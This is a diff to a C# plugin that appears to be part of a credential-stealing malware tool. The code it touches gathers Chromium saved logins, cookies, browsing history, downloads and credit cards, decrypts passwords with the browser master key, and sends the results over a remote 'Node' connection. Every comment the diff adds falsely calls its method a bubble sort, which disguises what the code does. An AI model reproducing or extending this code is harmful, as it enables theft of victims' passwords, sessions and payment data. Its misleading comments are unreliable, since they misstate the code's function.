@@ -16,6 +16,12 @@ namespace Plugin
 {
     public class Main
     {
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static byte[] SerializeLoginList(List<Chromium.Login> loginList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -32,6 +38,11 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static byte[] SerializeCookieList(List<Chromium.Cookie> cookieList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -50,6 +61,11 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static byte[] SerializeWebHistoryList(List<Chromium.WebHistory> historyList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -66,6 +82,11 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static byte[] SerializeDownloadList(List<Chromium.Download> downloadList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -81,7 +102,11 @@ namespace Plugin
             }
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static byte[] SerializeCreditCardList(List<Chromium.CreditCard> creditCardList)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -100,6 +125,11 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
@@ -201,6 +231,11 @@ namespace Plugin
         "Profile 5"
     };
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static byte[] GetMasterKey(string path)
         {
             if (!File.Exists(path))
@@ -225,6 +260,11 @@ namespace Plugin
             return null;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private string DecryptPassword(byte[] buffer, byte[] masterKey)
         {
             try
@@ -246,6 +286,12 @@ namespace Plugin
                 return null;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<List<Login>> GetLoginData()
         {
             List<Login> loginList = new List<Login>();
@@ -277,6 +323,12 @@ namespace Plugin
             }
             return loginList;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<List<Cookie>> GetCookies()
         {
             List<Cookie> cookieList = new List<Cookie>();
@@ -307,6 +359,12 @@ namespace Plugin
             }
             return cookieList;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<List<WebHistory>> GetWebHistory()
         {
             List<WebHistory> webHistoryList = new List<WebHistory>();
@@ -331,6 +389,12 @@ namespace Plugin
             }
             return webHistoryList;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<List<Download>> GetDownloads()
         {
             List<Download> downloadsList = new List<Download>();
@@ -355,6 +419,12 @@ namespace Plugin
             }
             return downloadsList;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<List<CreditCard>> GetCreditCards()
         {
             List<CreditCard> creditCardsList = new List<CreditCard>();
